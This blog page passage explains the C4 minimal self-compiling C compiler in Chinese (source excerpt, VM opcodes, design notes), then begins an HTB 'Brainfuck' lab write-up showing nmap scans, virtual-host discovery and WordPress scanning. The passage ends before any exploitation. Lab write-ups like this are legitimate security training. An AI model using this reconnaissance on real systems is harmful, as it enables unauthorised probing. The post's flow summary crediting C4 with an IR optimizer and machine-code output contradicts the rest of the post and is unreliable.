&#x27;&#123;&#x27;) &#123; printf(&quot;</span>%d: bad function definition\n<span class="string">&quot;, line); return -1; &#125;</span></span><br><span class="line"><span class="string">        loc = ++i;//局部變數偏移量</span></span><br><span class="line"><span class="string">        next();</span></span><br><span class="line"><span class="string">        while (tk == Int || tk == Char) &#123;//函數內變數聲明</span></span><br><span class="line"><span class="string">          bt = (tk == Int) ? INT : CHAR;</span></span><br><span class="line"><span class="string">          next();</span></span><br><span class="line"><span class="string">          while (tk != &#x27;;&#x27;) &#123;</span></span><br><span class="line"><span class="string">            ty = bt;</span></span><br><span class="line"><span class="string">            while (tk == Mul) &#123; next(); ty = ty + PTR; &#125;//處理指標型</span></span><br><span class="line"><span class="string">            if (tk != Id) &#123; printf(&quot;</span>%d: bad local declaration\n<span class="string">&quot;, line); return -1; &#125;</span></span><br><span class="line"><span class="string">            if (id[Class] == Loc) &#123; printf(&quot;</span>%d: duplicate local definition\n<span class="string">&quot;, line); return -1; &#125;</span></span><br><span class="line"><span class="string">//備份符號訊息</span></span><br><span class="line"><span class="string">            id[HClass] = id[Class]; id[Class] = Loc;</span></span><br><span class="line"><span class="string">            id[HType]  = id[Type];  id[Type] = ty;</span></span><br><span class="line"><span class="string">            id[HVal]   = id[Val];   id[Val] = ++i;//儲存變數偏移量</span></span><br><span class="line"><span class="string">            next();</span></span><br><span class="line"><span class="string">            if (tk == &#x27;,&#x27;) next();</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">          next();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">//為局部變數的入棧申請空間</span></span><br><span class="line"><span class="string">        *++e = ENT; *++e = i - loc;//函式局部變數數目</span></span><br><span class="line"><span class="string">        while (tk != &#x27;&#125;&#x27;) stmt();//語法分析</span></span><br><span class="line"><span class="string">        *++e = LEV;//函數回傳,解析完畢,彈棧</span></span><br><span class="line"><span class="string">        id = sym; //恢復全域變數的訊息</span></span><br><span class="line"><span class="string">        while (id[Tk]) &#123;</span></span><br><span class="line"><span class="string">//恢復符號訊息</span></span><br><span class="line"><span class="string">          if (id[Class] == Loc) &#123;</span></span><br><span class="line"><span class="string">            id[Class] = id[HClass];</span></span><br><span class="line"><span class="string">            id[Type] = id[HType];</span></span><br><span class="line"><span class="string">            id[Val] = id[HVal];</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">          id = id + Idsz;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      else &#123;</span></span><br><span class="line"><span class="string">        id[Class] = Glo;//全域變數</span></span><br><span class="line"><span class="string">        id[Val] = (int)data;//給全域變數在data段分配內存</span></span><br><span class="line"><span class="string">        data = data + sizeof(int);</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      if (tk == &#x27;,&#x27;) next();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    next();</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  if (!(pc = (int *)idmain[Val])) &#123; printf(&quot;</span>main() not defined\n<span class="string">&quot;); return -1; &#125;</span></span><br><span class="line"><span class="string">  if (src) return 0;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 設定堆疊</span></span><br><span class="line"><span class="string">  sp = (int *)((int)sp + poolsz);</span></span><br><span class="line"><span class="string">  *--sp = EXIT; // 如果main回傳則呼叫exit</span></span><br><span class="line"><span class="string">  *--sp = PSH; t = sp;</span></span><br><span class="line"><span class="string">  *--sp = argc;</span></span><br><span class="line"><span class="string">  *--sp = (int)argv;</span></span><br><span class="line"><span class="string">  *--sp = (int)t;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  // run...</span></span><br><span class="line"><span class="string">  cycle = 0;</span></span><br><span class="line"><span class="string">  while (1) &#123;</span></span><br><span class="line"><span class="string">    i = *pc++; ++cycle;</span></span><br><span class="line"><span class="string">    if (debug) &#123;</span></span><br><span class="line"><span class="string">//運算</span></span><br><span class="line"><span class="string">      printf(&quot;</span>%d&gt; %.<span class="number">4</span>s<span class="string">&quot;, cycle,</span></span><br><span class="line"><span class="string">        &amp;&quot;</span>LEA ,IMM ,JMP ,JSR ,BZ  ,BNZ ,ENT ,ADJ ,LEV ,LI  ,LC  ,SI  ,SC  ,PSH ,<span class="string">&quot;</span></span><br><span class="line"><span class="string">         &quot;</span>OR  ,XOR ,AND ,EQ  ,NE  ,LT  ,GT  ,LE  ,GE  ,SHL ,SHR ,ADD ,SUB ,MUL ,DIV ,MOD ,<span class="string">&quot;</span></span><br><span class="line"><span class="string">         &quot;</span>OPEN,READ,CLOS,PRTF,MALC,FREE,MSET,MCMP,EXIT,<span class="string">&quot;[i * 5]);</span></span><br><span class="line"><span class="string">      if (i &lt;= ADJ) printf(&quot;</span> %d\n<span class="string">&quot;, *pc); else printf(&quot;</span>\n<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">//記憶體結構</span></span><br><span class="line"><span class="string">    if      (i == LEA) a = (int)(bp + *pc++);                             // load local address</span></span><br><span class="line"><span class="string">    else if (i == IMM) a = *pc++;                                         // load global address or immediate</span></span><br><span class="line"><span class="string">    else if (i == JMP) pc = (int *)*pc;                                   // jump</span></span><br><span class="line"><span class="string">    else if (i == JSR) &#123; *--sp = (int)(pc + 1); pc = (int *)*pc; &#125;        // jump to subroutine</span></span><br><span class="line"><span class="string">    else if (i == BZ)  pc = a ? pc + 1 : (int *)*pc;                      // branch if zero</span></span><br><span class="line"><span class="string">    else if (i == BNZ) pc = a ? (int *)*pc : pc + 1;                      // branch if not zero</span></span><br><span class="line"><span class="string">    else if (i == ENT) &#123; *--sp = (int)bp; bp = sp; sp = sp - *pc++; &#125;     // enter subroutine</span></span><br><span class="line"><span class="string">    else if (i == ADJ) sp = sp + *pc++;                                   // stack adjust</span></span><br><span class="line"><span class="string">    else if (i == LEV) &#123; sp = bp; bp = (int *)*sp++; pc = (int *)*sp++; &#125; // leave subroutine</span></span><br><span class="line"><span class="string">    else if (i == LI)  a = *(int *)a;                                     // load int</span></span><br><span class="line"><span class="string">    else if (i == LC)  a = *(char *)a;                                    // load char</span></span><br><span class="line"><span class="string">    else if (i == SI)  *(int *)*sp++ = a;                                 // store int</span></span><br><span class="line"><span class="string">    else if (i == SC)  a = *(char *)*sp++ = a;                            // store char</span></span><br><span class="line"><span class="string">    else if (i == PSH) *--sp = a;                                         // push</span></span><br><span class="line"><span class="string">//執行流程</span></span><br><span class="line"><span class="string">    else if (i == OR)  a = *sp++ |  a;</span></span><br><span class="line"><span class="string">    else if (i == XOR) a = *sp++ ^  a;</span></span><br><span class="line"><span class="string">    else if (i == AND) a = *sp++ &amp;  a;</span></span><br><span class="line"><span class="string">    else if (i == EQ)  a = *sp++ == a;</span></span><br><span class="line"><span class="string">    else if (i == NE)  a = *sp++ != a;</span></span><br><span class="line"><span class="string">    else if (i == LT)  a = *sp++ &lt;  a;</span></span><br><span class="line"><span class="string">    else if (i == GT)  a = *sp++ &gt;  a;</span></span><br><span class="line"><span class="string">    else if (i == LE)  a = *sp++ &lt;= a;</span></span><br><span class="line"><span class="string">    else if (i == GE)  a = *sp++ &gt;= a;</span></span><br><span class="line"><span class="string">    else if (i == SHL) a = *sp++ &lt;&lt; a;</span></span><br><span class="line"><span class="string">    else if (i == SHR) a = *sp++ &gt;&gt; a;</span></span><br><span class="line"><span class="string">    else if (i == ADD) a = *sp++ +  a;</span></span><br><span class="line"><span class="string">    else if (i == SUB) a = *sp++ -  a;</span></span><br><span class="line"><span class="string">    else if (i == MUL) a = *sp++ *  a;</span></span><br><span class="line"><span class="string">    else if (i == DIV) a = *sp++ /  a;</span></span><br><span class="line"><span class="string">    else if (i == MOD) a = *sp++ %  a;</span></span><br><span class="line"><span class="string">//輸入輸出函數，包括了檔案讀寫、螢幕輸出等函數</span></span><br><span class="line"><span class="string">    else if (i == OPEN) a = open((char *)sp[1], *sp);</span></span><br><span class="line"><span class="string">    else if (i == READ) a = read(sp[2], (char *)sp[1], *sp);</span></span><br><span class="line"><span class="string">    else if (i == CLOS) a = close(*sp);</span></span><br><span class="line"><span class="string">    else if (i == PRTF) &#123; t = sp + pc[1]; a = printf((char *)t[-1], t[-2], t[-3], t[-4], t[-5], t[-6]); &#125;</span></span><br><span class="line"><span class="string">    else if (i == MALC) a = (int)malloc(*sp);</span></span><br><span class="line"><span class="string">    else if (i == FREE) free((void *)*sp);</span></span><br><span class="line"><span class="string">    else if (i == MSET) a = (int)memset((char *)sp[2], sp[1], *sp);</span></span><br><span class="line"><span class="string">    else if (i == MCMP) a = memcmp((char *)sp[2], (char *)sp[1], *sp);</span></span><br><span class="line"><span class="string">    else if (i == EXIT) &#123; printf(&quot;</span><span class="built_in">exit</span>(%d) cycle = %d\n<span class="string">&quot;, *sp, cycle); return *sp; &#125;</span></span><br><span class="line"><span class="string">    else &#123; printf(&quot;</span>unknown instruction = %d! cycle = %d\n<span class="string">&quot;, i, cycle); return -1; &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>它具備完整的詞法分析、語法分析、簡單的語意檢查、程式碼產生、執行環境（即虛擬機器）。</p>
<p>與常見的C編譯器不同的是，它把C語言原始程式編譯成字節碼（bytecode），然後在一個精簡的虛擬機器中解釋執行。</p>
<p>C4特別的地方就是可以自己編譯自己</p>
<p>先用GCC把C4編譯成執行檔：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc c4.c -o c4</span><br></pre></td></tr></table></figure>

<p>執行「Hello, World!」測試程式hello.c：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello,world\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/c4_1.png" alt="Untitled"></p>
<p>「hello, world」是hello.c 輸出的，「exit(0) cycle &#x3D; 9」是c4編譯器輸出的，表示程式正常運作結束，hello.c一共產生9個指令。</p>
<p>用GCC編譯c4.c產生了可執行檔c4，稱為編譯器A，然後用編譯器A來編譯c4的源碼c4.c，則產生一個編譯器B，然後再用編譯器B來編譯執行hello.c。</p>
<p><img src="/img/c4_2.png" alt="Untitled"></p>
<p>命令如下：</p>
<p>.&#x2F;c4 c4.c hello.c</p>
<p><img src="/img/c4_3.png" alt="Untitled"></p>
<p>理論上可以一直遞歸下去。遞歸的層次越深，產生的字節碼越多，執行所需的時間也越多。</p>
<p>C4實作的C語言子集<br>C4致力於用最少的程式碼，實作一個可以自舉的C編譯器。它的整個實作只有4個函數組成，可想而知，它不可能完整的實作整個C語言的規範，它只實作了C語言的一個子集。</p>
<h3 id="資料類型"><a href="#資料類型" class="headerlink" title="資料類型"></a>資料類型</h3><ul>
<li>char</li>
<li>int</li>
<li>指針</li>
<li>列舉（enum）</li>
<li>陣列</li>
<li>字串</li>
<li>不支援struct、typedef、union等資料類型。</li>
</ul>
<h3 id="語句結構"><a href="#語句結構" class="headerlink" title="語句結構"></a>語句結構</h3><ul>
<li>if-else控制語句</li>
<li>while迴圈語句</li>
<li>return語句</li>
<li>函數</li>
<li>不支援do-while、switch-case、for、continue、break、goto等語句結構。</li>
</ul>
<h3 id="運算符"><a href="#運算符" class="headerlink" title="運算符"></a>運算符</h3><p>它支援除+&#x3D;、%&#x3D;、&lt;&lt;&#x3D;、&amp;&#x3D;等符合運算子之外的幾乎所有運算子。包括：</p>
<ul>
<li><p>算術運算符</p>
</li>
<li><p>關係運算符</p>
</li>
<li><p>邏輯運算符</p>
</li>
<li><p>位元運算符</p>
</li>
<li><p>賦值運算符</p>
</li>
<li><p>雜項運算子（如三元運算子?:）</p>
</li>
<li><p>內建庫函數</p>
</li>
<li><p>Virtual Machine (c4)</p>
<ul>
<li>sp：stack frame。</li>
<li>a：register 暫存器。</li>
<li>bp：概念跟 rbp(32 bits)&#x2F;ebp(64 bits) 相同。</li>
<li>pc：program counter，指向當前指令。</li>
<li>instuction：OPCODE。</li>
</ul>
</li>
</ul>
<h3 id="內建庫函數"><a href="#內建庫函數" class="headerlink" title="內建庫函數"></a>內建庫函數</h3><p>C4編譯器實作時用到了一些系統函式庫函數，因此，為了實現自舉，它也內建支援了幾個函式庫函數。包括：</p>
<p>open、read、close、printf、malloc、free、memset、memcmp、exit<br>需要注意的是，它不支援以#開頭的預處理命令，如#include、#define、#if等。</p>
<p>程式碼註釋只支援「&#x2F;&#x2F;」開頭的單行註釋，不支援「&#x2F;* *&#x2F;」標記的多行註解形式。</p>
<p>與傳統的C語言編譯器相比，C4在實作上有其獨到之處。</p>
<p>下面，先簡單介紹一些傳統編譯器的實作過程。</p>
<h3 id="傳統典型編譯器的實現"><a href="#傳統典型編譯器的實現" class="headerlink" title="傳統典型編譯器的實現"></a>傳統典型編譯器的實現</h3><p>典型的編譯器的實現，通常都會有下面幾個過程：</p>
<ul>
<li>詞法分析</li>
<li>語法分析</li>
<li>語意分析</li>
<li>中間程式碼生成</li>
<li>程式碼最佳化</li>
<li>機器碼生成</li>
<li>如GCC、Clang….</li>
</ul>
<p><img src="/img/c4_4.png" alt="Untitled"></p>
<p>這些階段，會對程式碼進行多次掃描。這裡的程式碼，包括文字形式的原始碼、語法樹、中間程式碼等表示形式。</p>
<p>在典型的實作中，詞法分析和語法分析通常會糅合在一起，在語法分析時，呼叫詞法分析器逐一取得token。因此，理論上講，詞法分析和語法分析階段，只需要對源碼掃描一遍即可，並生成語法樹，有時也叫抽象語法樹（Abstract Syntax Tree）。</p>
<p>語意分析階段操作的主要物件就是這棵樹，至少要對這棵樹掃描一次。有些實作中，在進行語意檢查的同時也會直接產生中間程式碼。</p>
<p>在程式碼最佳化階段，根據編譯器最佳化的力度的不同，可能會對中間程式碼進行多次掃描。</p>
<p>這裡所謂的“掃描一遍”，在編譯器術語中一般稱為pass。對LLVM有了解的朋友應該知道，LLVM中每一種類型的最佳化都是一個pass，要應用多種最佳化技術，就需要有多個pass。</p>
<h3 id="程式流程"><a href="#程式流程" class="headerlink" title="程式流程"></a>程式流程</h3><p>總結這個程式的流程﻿ 1. 詞法分析器：</p>
<ul>
<li>忽略空白字元</li>
<li>識別符號、關鍵字、運算符、常數、字串等</li>
<li>將識別符號雜湊並儲存在符號表中</li>
</ul>
<ol start="2">
<li><p>語法分析器：</p>
<ul>
<li>遞迴下降解析器</li>
<li>處理表達式、語句和函數定義</li>
<li>產生中間代碼（IR → Instruction register）</li>
</ul>
</li>
<li><p>IR 優化器：</p>
<ul>
<li>進行常數摺疊、公共子表達式消除等優化</li>
</ul>
</li>
<li><p>程式碼生成器：</p>
<ul>
<li>將 IR 轉換為目標機器碼</li>
</ul>
</li>
<li><p>虛擬機：</p>
<ul>
<li>模擬目標機器執行機器碼</li>
<li>提供除錯功能</li>
</ul>
</li>
</ol>
<h3 id="解析程式流程"><a href="#解析程式流程" class="headerlink" title="解析程式流程"></a><strong>解析程式流程</strong></h3><ol>
<li><strong>詞法分析</strong>：將原始碼切割成一個個的 token，並賦予其對應的 token number。</li>
</ol>
<ul>
<li>詞法分析器會逐個字元地掃描原始碼，並將字元組合成 token。</li>
<li>token 是原始碼中具有特定意義的字元序列，例如關鍵字、識別符號、運算符、分隔符等。</li>
<li>詞法分析器會將 token 分配給對應的 token number，以便後續的語法分析和語義分析。</li>
</ul>
<ol>
<li><strong>語法分析</strong>：將 token 組合起來，形成語法樹。</li>
</ol>
<ul>
<li>語法分析器會根據當前的 token 和語法規則，決定如何將 token 組合起來形成語法樹。</li>
<li>語法樹是一種樹狀結構，它表示原始碼的語法結構。</li>
<li>語法分析器會檢查語法樹是否符合語法規則，如果發現語法錯誤，則會報錯。</li>
</ul>
<ol>
<li><strong>語義分析</strong>：檢查語法樹是否符合語法規則，並產生對應的 IR (Intermediate Representation) 指令。</li>
</ol>
<ul>
<li>語義分析器會檢查語法樹是否符合語法規則，並產生對應的 IR 指令。</li>
<li>IR 指令是一種中間表示，它比機器碼更接近原始碼，但又比原始碼更接近機器碼。</li>
<li>IR 指令可以被編譯器轉換成機器碼。</li>
</ul>
<ol>
<li><strong>程式碼生成</strong>：將 IR 指令轉換成機器碼。</li>
</ol>
<ul>
<li>程式碼生成器會將 IR 指令轉換成機器碼。</li>
<li>機器碼是電腦可以直接執行的指令。</li>
</ul>
<ol>
<li><strong>執行</strong>：將機器碼載入到記憶體中，並執行。</li>
</ol>
<ul>
<li>執行器會將機器碼載入到記憶體中，並執行。</li>
<li>電腦會根據機器碼的指令，一步一步地執行程式。</li>
</ul>
<p>在這個專案程式中，詞法分析、語法分析、語義分析和代碼生成都是由同一個程式來完成的。</p>
<p>這個程式會逐行讀取原始碼，並將原始碼轉換成機器碼。然後，程式會將機器碼載入到記憶體中，並執行。</p>
<h3 id="C4的獨具特色之處"><a href="#C4的獨具特色之處" class="headerlink" title="C4的獨具特色之處"></a>C4的獨具特色之處</h3><p>作為追求極簡主義的C4編譯器來說，它在實作上有許多獨具特色之處。</p>
<h3 id="對C源碼解釋執行"><a href="#對C源碼解釋執行" class="headerlink" title="對C源碼解釋執行"></a>對C源碼解釋執行</h3><p>傳統的C語言編譯器，最後都把C語言原始碼編譯成可執行文件，也就是二進位的機器碼。</p>
<p>而C4則是把C語言原始碼先編譯成其專門設計的字節碼（bytecode），然後直接在虛擬機器中解釋執行。</p>
<p>C4設計了39個字節碼指令，其中大部分與彙編語言中的指令有些類似，主要是記憶體載入指令，算術運算指令等，此外，還包含了為支援內建的函式庫函數而專門設計的9條特殊的函式庫函數呼叫指令。</p>
<p>它的虛擬機是典型的堆疊式虛擬機（Java虛擬機也是典型的堆疊式虛擬機，早期的Lua也是棧式虛擬機，但最新的Lua 5.x採用暫存器虛擬機）。</p>
<p>可以使用-d指令，把產生的字節碼dump出來。下圖是hello.c的字節碼：</p>
<p><img src="/img/c4_5.png" alt="Untitled"></p>
<p><strong>對源碼只掃描一遍</strong></p>
<p>與傳統的編譯器實作不同，C4它把詞法分析、語法分析、語意分析、程式碼產生這幾個步驟巧妙的結合在一起，在把C語言源碼編譯成字節碼的整個過程中，只掃描了一遍源碼。</p>
<p>Lua的解釋器也是採用對原始碼掃描一遍的方式，因此，C4和Lua的表現都相當不錯。</p>
<h3 id="C4原始碼的可讀性"><a href="#C4原始碼的可讀性" class="headerlink" title="C4原始碼的可讀性"></a><strong>C4原始碼的可讀性</strong></h3><p>C4的實作非常簡潔，畢竟只有4個函數，500多行程式碼。但是要真正完全理解，需要有一定的編譯原理基礎知識。</p>
<p>例如C4的語法分析過程中，就是<strong>典型的遞歸下降和算子優先演算法結合</strong>的實作方式。只要了解這些編譯器的經典演算法原理，C4的實作邏輯理解起來，還是比較輕鬆的。</p>
<p>C4不支援struct類型。這也意味著C4的源碼中不能使用struct型別。為此，它選擇<strong>使用陣列</strong>來模擬struct結構。這樣乍看，可能會產生一些困惑。</p>
<p>C4的一個槽點，就是它變數的命名上，過於簡潔。例如標記字節碼的位置的變數用e表示，其實如果用emit的話，就會清晰許多，也會更容易理解。</p>
<h3 id="C4的衍生實現"><a href="#C4的衍生實現" class="headerlink" title="C4的衍生實現"></a>C4的衍生實現</h3><p>除了C4的原生實作外，網路上也有很多基於C4的衍生實作。</p>
<p>例如有人為C4額外增加了80多行程式碼，卻為C4增加了JIT功能，使得執行速度明顯提升。</p>
<p>也有人對C4做了簡單修改，使得它可以直接產生真實的機器碼，最後產生ELF執行檔。</p>
<h3 id="Virtual-Machine-Opcode"><a href="#Virtual-Machine-Opcode" class="headerlink" title="Virtual Machine (Opcode)"></a><strong>Virtual Machine (Opcode)</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// opcodes</span><br><span class="line">enum &#123; LEA ,IMM ,JMP ,JSR ,BZ  ,BNZ ,ENT ,ADJ ,LEV ,LI  ,LC  ,SI  ,SC  ,PSH ,</span><br><span class="line">       OR  ,XOR ,AND ,EQ  ,NE  ,LT  ,GT  ,LE  ,GE  ,SHL ,SHR ,ADD ,SUB ,MUL ,DIV ,MOD ,</span><br><span class="line">       OPEN,READ,CLOS,PRTF,MALC,FREE,MSET,MCMP,EXIT &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/pcp5DfL.png" alt="https://i.imgur.com/pcp5DfL.png"></p>
<table>
<thead>
<tr>
<th>Opcode</th>
<th>Fully Name</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>LEA</td>
<td>Load Effective Address</td>
<td>利用 bp 將相對位址存入暫存器 a</td>
</tr>
<tr>
<td>IMM</td>
<td>Immediate Value</td>
<td>將 immediate value or global address 存入暫存器 a</td>
</tr>
<tr>
<td>JMP</td>
<td>Jump</td>
<td>跳轉至目標指令的絕對位址</td>
</tr>
<tr>
<td>JSR</td>
<td>Jump to SubRoutine</td>
<td>Push return address into sp and JMP</td>
</tr>
<tr>
<td>BZ</td>
<td>Branch if Zero</td>
<td>後面接的是目標指令的絕對位址</td>
</tr>
<tr>
<td>BNZ</td>
<td>Branch if NOT Zero</td>
<td>後面接的是目標指令的絕對位址</td>
</tr>
<tr>
<td>ENT</td>
<td>Enter SubRoutine</td>
<td>Push bp and bp points to sp，sp 會預留 local variables 的位置</td>
</tr>
<tr>
<td>ADJ</td>
<td>Stack Adjust</td>
<td>根據目前 sp 的相對位置</td>
</tr>
<tr>
<td>LEV</td>
<td>Leave SubRoutine</td>
<td>sp&#x3D;bp, bp points to old bp, 讀取 return address to pc, sp++釋放空間</td>
</tr>
<tr>
<td>LI</td>
<td>Load INT</td>
<td>將暫存器 a 所指的位址取值，存入暫存器 a</td>
</tr>
<tr>
<td>LC</td>
<td>Load CHAR</td>
<td>將暫存器 a 所指的位址取值，存入暫存器 a</td>
</tr>
<tr>
<td>SI</td>
<td>Store INT</td>
<td>將暫存器 a 取值，存入 stack frame sp 所指的位址，然後 sp++</td>
</tr>
<tr>
<td>SC</td>
<td>Store CHAR</td>
<td>將暫存器 a 取值，存入 stack frame sp 所指的位址，然後 sp++，最後再存入暫存器 a</td>
</tr>
<tr>
<td>PSH</td>
<td>Push into Stack Frame</td>
<td>將暫存器 a 的值 push into Stack Frame</td>
</tr>
<tr>
<td>OR-MODE</td>
<td>Arithmetic operation</td>
<td>pop from Stack Frame and calculate with register value, and then restore into regrister.</td>
</tr>
<tr>
<td>OPEN-MEMCMP</td>
<td>System Call</td>
<td>使用 Stack Frame sp 當作參數傳遞，並且 pop Stack</td>
</tr>
<tr>
<td>EXIT</td>
<td>exit program</td>
<td>利用 Stack Frame sp 當作回傳值</td>
</tr>
</tbody></table>
<p>• c4 在 <code>next()</code> Lexical analyzer 的時候就有包含 semantic analyzer，這時候會建立 symbol table；在 <code>main()</code> 會檢查是否重複定義；在 <code>expr()</code> 會做 type checking and undefined variable checking，這些部分也是屬於 semantic analyzer。</p>
<h3 id="stmt"><a href="#stmt" class="headerlink" title="stmt()"></a><strong>stmt()</strong></h3><p>利用 recursive-descent 處理 “if-else”, “while”, “return”, “{}”, “;”。這部分的 source code 非常直觀</p>
<p>其他參考資料</p>
<p><a target="_blank" rel="noopener" href="https://github.com/lotabout/write-a-C-interpreter">https://github.com/lotabout/write-a-C-interpreter</a></p>
<p><a target="_blank" rel="noopener" href="https://hackmd.io/@srhuang/Bkk2eY5ES#main--declaration">https:&#x2F;&#x2F;hackmd.io&#x2F;@srhuang&#x2F;Bkk2eY5ES#main–declaration</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/rswier/c4/blob/master/c4.c">https://github.com/rswier/c4/blob/master/c4.c</a></p>
<p><strong>特點：</strong></p>
<ul>
<li>簡單：僅用500餘行程式碼就實現了一個c編譯器。</li>
<li>類似解釋器：實現了自己的虛擬機器指令集，直接產生為目標程式碼，忽略中間程式碼的過程。</li>
<li>自舉：可以自己編譯自己。</li>
<li>只能在32位元環境下跑。</li>
<li>單趟編譯器：分析過程只有一遍。</li>
<li>語法分析屬於自頂向下分析法，表達式分析採了比較流行的用遞歸下降和運算子優先級方法結合的方式。</li>
</ul>
<p><strong>分析：</strong></p>
<ul>
<li>c4編譯器是一個非常簡單的編譯器，但它實現了編譯器的基本原理，是一個很好的學習資源。</li>
<li>c4編譯器類似於解釋器，它直接產生為目標程式碼，忽略中間程式碼的過程。這使得它比傳統的編譯器更簡單，但執行速度也更慢。</li>
<li>c4編譯器可以自己編譯自己，這是一個非常強大的功能。它意味著c4編譯器可以移植到任何支援C語言的平臺上。</li>
<li>c4編譯器是單趟編譯器，這意味著它在遍歷原始程式碼時只會分析一遍。這使得c4編譯器非常快，但它也意味著c4編譯器不能檢測出所有的錯誤。</li>
<li>c4編譯器的語法分析屬於自頂向下分析法，表達式分析採了比較流行的用遞歸下降和運算子優先級方法結合的方式。這使得c4編譯器的語法分析非常高效。</li>
</ul>
<p><strong>總結：</strong></p>
<p>c4編譯器是一個非常簡單、強大且高效的編譯器。它是一個很好的學習資源，也非常適合用於移植到其他平臺上。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="Brainfuck-Brainfuck" class="article article-type-Brainfuck" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Brainfuck/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.076Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Brainfuck/">
        HTB_Brainfuck
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Brainfuck"><a href="#Brainfuck" class="headerlink" title="Brainfuck"></a>Brainfuck</h1><ul>
<li><p>IP 10.129.228.97</p>
</li>
<li><p>tun0 10.10.16.11</p>
</li>
<li><p>nmap -sV -sC -A -T4 -Pn 10.129.228.97</p>
</li>
</ul>
<p><img src="/img/Brainfuck_Untitled.png" alt="Untitled"></p>
<ul>
<li>nmap -p 1-65535 -T4 -A -v 10.129.228.97</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_1.png" alt="Untitled"></p>
<p><img src="/img/Brainfuck_Untitled_2.png" alt="Untitled"></p>
<p>find port</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Discovered open port 443/tcp on 10.129.228.97</span><br><span class="line">Discovered open port 22/tcp on 10.129.228.97</span><br><span class="line">Discovered open port 143/tcp on 10.129.228.97</span><br><span class="line">Discovered open port 25/tcp on 10.129.228.97</span><br><span class="line">Discovered open port 110/tcp on 10.129.228.97</span><br></pre></td></tr></table></figure>

<p>Because it is found that there is an nginx service that opens 443, so open the default webpage to confirm,SO..When we visit the localhost default web page</p>
<p><img src="/img/Brainfuck_Untitled_3.png" alt="Untitled"></p>
<p>Notice here that there are three domain names</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)</span><br><span class="line">| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR</span><br><span class="line">| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb</span><br><span class="line">| Issuer: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>sup3rs3cr3t.brainfuck.htb</strong></li>
<li><strong><a target="_blank" rel="noopener" href="http://www.brainfuck.htb/">www.brainfuck.htb</a></strong></li>
<li><strong>brainfuck.htb</strong></li>
</ul>
<p>now write &#x2F;etc&#x2F;hosts Add three domains to this file</p>
<p><img src="/img/Brainfuck_Untitled_4.png" alt="Untitled"></p>
<p>when I browse <a target="_blank" rel="noopener" href="https://brainfuck.htb/">https:&#x2F;&#x2F;**brainfuck.htb</a>** website,The webpage directly indicates that he is a wordpress website, and pointing to the SMTP mail ID <a href="mailto:&#111;&#114;&#101;&#115;&#116;&#105;&#x73;&#64;&#98;&#114;&#x61;&#105;&#110;&#x66;&#117;&#x63;&#x6b;&#x2e;&#x68;&#x74;&#98;">&#111;&#114;&#101;&#115;&#116;&#105;&#x73;&#64;&#98;&#114;&#x61;&#105;&#110;&#x66;&#117;&#x63;&#x6b;&#x2e;&#x68;&#x74;&#98;</a></p>
<p><img src="/img/Brainfuck_Untitled_5.png" alt="Untitled"></p>
<p>Check whether there are any types of vulnerable themes, plug-ins, user names, etc.</p>
<ul>
<li>Web Application Analysis (wpscan - WordPress vulnerability scanner)</li>
</ul>
<p>不管透過官方平台或是自己架設的WordPress網站，就都是這次介紹的工具<code>wpscan</code><br>鎖定的目標了，它位於Kali的<strong>Web Application Analysis</strong>分類之中，直接執行可以看到介紹與基本用法</p>
<p><a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10274253">Day 14 網頁分析 - Web Application Analysis (wpscan - WordPress vulnerability scanner) - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>
